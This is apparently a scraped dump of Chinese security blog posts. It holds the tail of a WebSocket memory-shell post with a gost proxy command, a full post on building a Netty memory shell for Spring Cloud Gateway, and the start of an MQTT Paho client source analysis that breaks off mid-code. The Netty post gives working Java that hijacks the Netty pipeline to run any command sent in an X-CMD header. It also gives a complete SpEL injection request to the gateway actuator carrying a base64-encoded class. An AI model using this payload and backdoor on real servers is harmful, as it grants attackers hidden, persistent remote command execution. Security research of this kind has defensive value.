操作成功完成时调用该方法(result:实际读取的字节数。如果通道中没有数据可读则result=-1) failed：如果 I/O 操作失败，则调用该方法。这些方法的实现应该及时完成，以避免阻止调用线程分派到其他完成处理程序 这里clear之后在调用remaining()获取未读数据 clear() ： 清空缓冲区，官方说明是“clears the buffer”，但详细解释是将 position 和 limit 恢复“出厂设置”，并丢弃 mark。注意，缓冲区中的数据并非清空，只是将两个指针重置，数据处在一种**“被遗忘”状态**，如果进行 get()操作依然可以取出。同时，clear 执行之后的缓冲区无法通过 rewind() 回退指针。所以这时候调用remaining依旧能够获取缓冲区未读的数据 当缓冲区存在数据且读取到字节&gt;=0时：数据数据通过sendBinary函数发送给远程socket端点(也就是Socket-channel服务端) 当缓冲区没有数据，但是依旧读取字节时将数据线存入baos，然后回调readFromServer读取(异步) 使用 注入完内存马以后，使用 Gost：https://github.com/go-gost/gost 连接代理 gost-windows-amd64.exe -L &quot;socks5://:1080&quot; -F &quot;ws://127.0.0.1:8080?path=/proxy&quot; 然后代理连接本地1080端口socks5即可 总结 WebSoket内存马通过分析涉及处理websoket的Endpoint对象，获取请求内容，同时控制响应内容。然后只要模拟对象注册到内存当中过程即可。代理的实现稍微复杂一点，注册的Endpoint对象需要实现与服务端(Endpoint远端)之间的连接与通信 参考 https://www.cnblogs.com/duanxz/p/5041110.html https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/ https://veo.pub/2022/memshell/ ","link":"https://liangyueliangyue.github.io/post/websocket-nei-cun-ma/"},{"title":"Netty内存马","content":"Netty netty的web服务没有遵循servlet规范来设计。这也导致了构造它的内存马，与常规中间件有所不同，从某种程度来讲是这是一种新类型的内存马。 环境搭建 这里用spring cloud gateway的web服务，详情可以看之前的文章 是netty+spring构建的 原理学习 netty处理http请求是构建一条责任链pipline,http请求会被链上的handler会依次来处理。所以我们的内存马其实就是一个handler。 不像常规的中间件，filter/servlet/listener组件有一个统一的维护对象。 netty每一个请求过来，都是动态构造pipeline，pipeline上的handler都是在这个时候new的。负责给pipeline添加handler是ChannelPipelineConfigurer(下面简称为configurer)，因此注入netty内存马的关键是分析configurer如何被netty管理和工作的。 ChannelPipelineConfigurer的实现类 CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer是为pipeline选择configurer的关键逻辑。 static ChannelPipelineConfigurer compositeChannelPipelineConfigurer(ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other) { if (configurer == ChannelPipelineConfigurer.emptyConfigurer()) { // 默认configurer是无操作空配置 return other; } else if (other == ChannelPipelineConfigurer.emptyConfigurer()) { // 其他额外configurer是无操作空配置 return configurer; } else { ...... ChannelPipelineConfigurer[] newConfigurers = new ChannelPipelineConfigurer[length]; int pos; if (thizConfigurers != null) { pos = thizConfigurers.length; System.arraycopy(thizConfigurers, 0, newConfigurers, 0, pos); } else { pos = 1; newConfigurers[0] = configurer; // 将默认configurer存储到新configurer } if (otherConfigurers != null) { System.arraycopy(otherConfigurers, 0, newConfigurers, pos, otherConfigurers.length); } else { newConfigurers[pos] = other; // 将其他额外configurer存储到新configurer } // 合并成新的configurer return new ReactorNetty.CompositeChannelPipelineConfigurer(newConfigurers); } } 第一个参数是Spring cloud gateway默认的configurer，第二个是用户额外配置的。一般情况下第一个参数是不为空配置，第二个参数为空配置，所以返回的configurer是Spring cloud gateway默认的。 如果我们能够设置第二个other参数不为空配置呢？ 那么这两个configurer将被合并为一个新CompositeChannelPipelineConfigurer。 CompositeChannelPipelineConfigurer会循环调用所有合并进来configurer来对pipeline添加handler。 //初始化时调用 public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, @Nullable SocketAddress remoteAddress) { ChannelPipelineConfigurer[] var4 = this.configurers; int var5 = var4.length; for(int var6 = 0; var6 &lt; var5; ++var6) { ChannelPipelineConfigurer configurer = var4[var6]; configurer.onChannelInit(connectionObserver, channel, remoteAddress); } } 因此我们可以通过修改other参数为自己的configurer向pipline中添加内存马。翻阅源码发现reactor.netty.transport.TransportConfig类的doOnChannelInit属性存储着other参数，我使用java-object-searcher以doOnChannelInit为关键字，定位出了它在线程对象的位置。 List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;(); keys.add(new Keyword.Builder().setField_type(&quot;doOnChannelInit&quot;).build()); SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); searcher.setIs_debug(true); searcher.setMax_search_depth(20); searcher.setReport_save_path(&quot;D:\\\\&quot;); searcher.searchObject(); 结果 threads = {class [Ljava.lang.Thread;} ---&gt; [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} ---&gt; val$disposableServer = {reactor.netty.transport.ServerTransport$InetDisposableBind} ---&gt; config = {reactor.netty.http.server.HttpServerConfig} ---&gt; doOnChannelInit = {reactor.netty.ReactorNetty$$Lambda$390/910260820} 构造内存马 import io.netty.buffer.Unpooled; import io.netty.channel.*; import io.netty.handler.codec.http.*; import io.netty.util.CharsetUtil; import reactor.netty.ChannelPipelineConfigurer; import reactor.netty.ConnectionObserver; import java.lang.reflect.Array; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.net.SocketAddress; import java.util.Scanner; public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer { public static String doInject(){ String msg = &quot;inject-start&quot;; try { Method getThreads = Thread.class.getDeclaredMethod(&quot;getThreads&quot;); getThreads.setAccessible(true); Object threads = getThreads.invoke(null); //获取线程对象 for (int i = 0; i &lt; Array.getLength(threads); i++) { Object thread = Array.get(threads, i); if (thread != null &amp;&amp; thread.getClass().getName().contains(&quot;NettyWebServer&quot;)) { Field _val$disposableServer = thread.getClass().getDeclaredField(&quot;val$disposableServer&quot;); _val$disposableServer.setAccessible(true); Object val$disposableServer = _val$disposableServer.get(thread); Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(&quot;config&quot;); _config.setAccessible(true); Object config = _config.get(val$disposableServer); Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;doOnChannelInit&quot;); //一级一级获取到doOnChannelInit对象 _doOnChannelInit.setAccessible(true); //设置other和默认合并为新CompositeChannelPipelineConfigurer _doOnChannelInit.set(config, new NettyMemshell()); msg = &quot;inject-success&quot;; } } }catch (Exception e){ msg = &quot;inject-error&quot;; } return msg; } @Override // Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) { ChannelPipeline pipeline = channel.pipeline(); // 将内存马的handler添加到spring层handler的前面 pipeline.addBefore(&quot;reactor.left.httpTrafficHandler&quot;,&quot;memshell_handler&quot;,new NettyMemshell()); } @Override // Step2. 作为Handler处理请求，在此实现内存马的功能逻辑 public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { if(msg instanceof HttpRequest){ HttpRequest httpRequest = (HttpRequest)msg; try { if(httpRequest.headers().contains(&quot;X-CMD&quot;)) { String cmd = httpRequest.headers().get(&quot;X-CMD&quot;); String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\\\A&quot;).next(); // 返回执行结果 send(ctx, execResult, HttpResponseStatus.OK); return; } }catch (Exception e){ e.printStackTrace(); } } ctx.fireChannelRead(msg); } private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) { FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8)); response.headers().set(HttpHeaderNames.CONTENT_TYPE, &quot;text/plain; charset=UTF-8&quot;); ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE); } } netty ChannelHandler放置顺序 代理？[ProxyHandler]-&gt;ssl？[SslHandler]-&gt;ssl跟踪日志（&amp;T）？[SslLoggingHandler]-&gt;ssl？[SslReader]-&gt;日志？[LoggingHandler]-&gt;http？[HttpCodecHandler]-&gt;http-ws？[HttpAggregator]-&gt;http服务器？[HttpTrafficHandler]-&gt;onWriteIdle？[OnChannelWriteIdle]-&gt;onReadIdle？[OnChannelReadIdle]-&gt;http form/multipart？[ChunkedWriter]=&gt;[ReactiveBridge] scanner.useDelimiter命令在于设置当前scanner的分隔符,默认是空格,\\A为正则表达式,表示从字符头开始，整体意思就是读取所有输入,包括回车换行符 注意：这里需要包含依赖，但是不需要pakeage java-&gt;class-&gt;base64 linux cat Test.class | base64 -w 0 | xargs windows，powershell a = [System.IO.File]::ReadAllBytes(&quot;.\\Test.class&quot;) ; [System.Convert]::ToBase64String(a) 攻击请求 POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.159.132:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/json Content-Length: 8157 { &quot;id&quot;: &quot;hacktest&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: { &quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBFAoAPgB9CAB+BwB/CABTBwCACgAFAIEKAIIAgwcAhAoAggCFCgCGAIcKAIYAiAoACACJCgAFAIoIAIsKAIwAjQgASwoABQCOCgCPAIMKAI8AkAoABQCRCABOCACSBwCTCgAXAH0KAI8AlAgAlQcAlggAlwsAmACZCACaCACbCwCcAJ0HAJ4LACEAnwgAoAoAoQCiCgChAKMHAKQKAKUApgoApQCnCgCoAKkKACYAqggAqwoAJgCsCgAmAK0JAK4ArwoAFwCwCgAbALELALIAswcAtAkAtQC2CQC3ALgKALkAugoAMgC7CwC8AJ8JAL0AvggAvwoAoQDACwCyAMEJAMIAwwsAxADFBwDGBwDHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAyAcAyQcAhAcAlgEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsHAJ4BAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAygDLBwDJDADMAM0BABBqYXZhL2xhbmcvT2JqZWN0DADOAM8HANAMANEA0gwA0wDUDADVANYMANcASAEADk5ldHR5V2ViU2VydmVyBwDIDADYANkMANoA2wcA3AwA0wDdDADeANYBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADfAOABAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHAOEMAGcA4gEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDjDADkAOUBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOYA5wEABVgtQ01EBwDoDADYAOkMANMA6gEAEWphdmEvdXRpbC9TY2FubmVyBwDrDADsAO0MAO4A7wcA8AwA8QDyDABAAPMBAAJcQQwA9AD1DAD2AEgHAPcMAPgAeAwAdAB1DAD5AEEHAPoMAPsA/AEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA/QwA/gD/BwEADAEBAQIHAQMMAQQBBQwAQAEGBwEHBwEIDAEJAQoBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADfAQsMAQwBDQcBDgwBDwEQBwERDAESARMBACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAF0BAAD7AIX4AAVCBwBeAwABAF8AYAACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABhAGIAAQAAABwAYwBkAAIAAAAcAGUAZgADAAgAFABnAGgABABpAAAADQMAYQAAAGMAAABlAAAAAQBqAGsAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGwAWQAEAEMACwBtAFkABQBTAAUAVgBXAAQADABMAG4AbwADAAAAYQBFAEYAAAAAAGEAcABxAAEAAABhAFgATAACAFoAAAAPAAP8AE4HAHJCBwBe+gAGAHMAAAAEAAEAGwBpAAAACQIAcAAAAFgAAAACAHQAdQACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBwAHEAAQAAADYAdgBZAAIAAAA2AHcAeAADABQAIgB5AHoABABpAAAADQMAcAAAAHYAAAB3AAAAAQB7AAAAAgB8'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}&quot; } }], &quot;uri&quot;: &quot;http://example.com&quot; } 最后成果 总结 最后还是要用c0ny1 师傅的一句话： 关于各个协议和组件的内存马的构造思路其实都大同小异，说白了就是分析涉及处理请求的对象，阅读它的源码看看是否能获取请求内容，同时能否控制响应内容。然后分析该对象是如何被注册到内存当中的，最后我们只要模拟下这个过程即可。 ","link":"https://liangyueliangyue.github.io/post/netty-nei-cun-ma/"},{"title":"MQTT协议-Eclipse Paho Java Client源码分析（二）","content":"文章首发于跳跳糖：https://tttang.com/archive/1627/ 前文讲到主要从五个点来进行源码学习 连接broker 创建主题 发布主题内容 订阅主题 接收主题内容 连接broker 上文写过的简单例子可以知道首先调用的是MqttClient的connect方法 而aClient是MqttAsyncClient所以调用的是MqttAsyncClient的connect方法，最终指向都是如下（代码太长就不贴图了） public IMqttToken connect(MqttConnectOptions options, Object userContext, IMqttActionListener callback) throws MqttException, MqttSecurityException { if (this.comms.isConnected()) { throw ExceptionHelper.createMqttException(32100); } else if (this.comms.isConnecting()) { throw new MqttException(32110); } else if (this.comms.isDisconnecting()) { throw new MqttException(32102); } else if (this.comms.isClosed()) { throw new MqttException(32111); } else { if (options == null) { options = new MqttConnectOptions(); } this.connOpts = options; this.userContext = userContext; boolean automaticReconnect = options.isAutomaticReconnect(); log.fine(CLASS_NAME, &quot;connect&quot;, &quot;103&quot;, new Object[]{options.isCleanSession(), new Integer(options.getConnectionTimeout()), new Integer(options.getKeepAliveInterval()), options.getUserName(), options.getPassword() == null ? &quot;[null]&quot; : &quot;[notnull]&quot;, options.getWillMessage() == null ? &quot;[null]&quot; : &quot;[notnull]&quot;, userContext, callback}); this.comms.setNetworkModules(this.createNetworkModules(this.serverURI, options)); this.comms.setReconnectCallback(new MqttAsyncClient.MqttReconnectCallback(automaticReconnect)); MqttToken userToken = new MqttToken(this.getClientId()); ConnectActionListener connectActionListener = new ConnectActionListener(this, this.persistence, this.comms, options, userToken, userContext, callback, this.reconnecting); userToken.setActionCallback(connectActionListener); userToken.setUserContext(this); if (this.mqttCallback instanceof MqttCallbackExtended) { connectActionListener.setMqttCallbackExtended((MqttCallbackExtended)this.mqttCallback); } this.comms.setNetworkModuleIndex(0); connectActionListener.connect(); return userToken; } } 首先调用了MqttAsyncClient中创建的ClientComms对象中isConnected、isConnecting、isDisconnecting、isClosed四个方法（这样的方法存在6个） 通过conState的值去判断Clinet当前的状态，如果是连接中，正在连接，正在断开，关闭这几个状态就会进入异常处理 也就是正常连接时ClientComms.conState应该为3 再往下判断options是否为null，如果为null会创建一个MqttConnectOptions对象，下面就会用到 之后再调用MqttConnectOptions#isAutomaticReconnect，返回automaticReconnect，默认为false private boolean automaticReconnect = false; 这个标志位的作用就是客户端断开是否会自动尝试重新连接，默认不进行重连 NetworkModules 首先是MqttAsyncClient#createNetworkModules方法来创建NetworkModule对象 protected NetworkModule[] createNetworkModules(String address, MqttConnectOptions options) throws MqttException, MqttSecurityException { final String methodName = &quot;createNetworkModules&quot;; // @TRACE 116=URI={0} log.fine(CLASS_NAME, methodName, &quot;116&quot;, new Object[] { address }); NetworkModule[] networkModules = null; String[] serverURIs = options.getServerURIs(); String[] array = null; if (serverURIs == null) { array = new String[] { address }; } else if (serverURIs.length == 0) { array = new String[] { address }; } else { array = serverURIs; } networkModules = new NetworkModule[array.length]; for (int i = 0; i &lt; array.length; i++) { networkModules[i] = createNetworkModule(array[i], options); } log.fine(CLASS_NAME, methodName, &quot;108&quot;); return networkModules; } 尝试从MqttConnectOptions中获取serverURL，如果获取不到会使用传入的serverURL，然后new 了一个实现NetworkModule接口的对象 通过循环将serverURL数组中的值调用createNetworkModule然后存入networkModules返回。 看下createNetworkModule private NetworkModule createNetworkModule(String address, MqttConnectOptions options) throws MqttException, MqttSecurityException { final String methodName = &quot;createNetworkModule&quot;; // @TRACE 115=URI={0} log.fine(CLASS_NAME,methodName, &quot;115&quot;, new Object[] {address}); NetworkModule netModule; SocketFactory factory = options.getSocketFactory(); int serverURIType = MqttConnectOptions.validateURI(address); URI uri; try { uri = new URI(address); // If the returned uri contains no host and the address contains underscores, // then it's likely that Java did not parse the URI if(uri.getHost() == null &amp;&amp; address.contains(&quot;_&quot;)){ try { final Field hostField = URI.class.getDeclaredField(&quot;host&quot;); hostField.setAccessible(true); // Get everything after the scheme:// String shortAddress = address.substring(uri.getScheme().length() + 3); hostField.set(uri, getHostName(shortAddress)); } catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException e) { throw ExceptionHelper.createMqttException(e.getCause()); } } } catch (URISyntaxException e) { throw new IllegalArgumentException(&quot;Malformed URI: &quot; + address + &quot;, &quot; + e.getMessage()); } String host = uri.getHost(); int port = uri.getPort(); // -1 if not defined switch (serverURIType) { case MqttConnectOptions.URI_TYPE_TCP : if (port == -1) { port = 1883; } if (factory == null) { factory = SocketFactory.getDefault(); } else if (factory instanceof SSLSocketFactory) { throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH); } netModule = new TCPNetworkModule(factory, host, port, clientId); ((TCPNetworkModule)netModule).setConnectTimeout(options.getConnectionTimeout()); break; case MqttConnectOptions.URI_TYPE_SSL: if (port == -1) { port = 8883; } SSLSocketFactoryFactory factoryFactory = null; if (factory == null) { // try { factoryFactory = new SSLSocketFactoryFactory(); Properties sslClientProps = options.getSSLProperties(); if (null != sslClientProps) factoryFactory.initialize(sslClientProps, null); factory = factoryFactory.createSocketFactory(null); // } // catch (MqttDirectException ex) { // throw ExceptionHelper.createMqttException(ex.getCause()); // } } else if ((factory instanceof SSLSocketFactory) == false) { throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH); } // Create the network module... netModule = new SSLNetworkModule((SSLSocketFactory) factory, host, port, clientId); ((SSLNetworkModule)netModule).setSSLhandshakeTimeout(options.getConnectionTimeout()); ((SSLNetworkModule)netModule).setSSLHostnameVerifier(options.getSSLHostnameVerifier()); // Ciphers suites need to be set, if they are available if 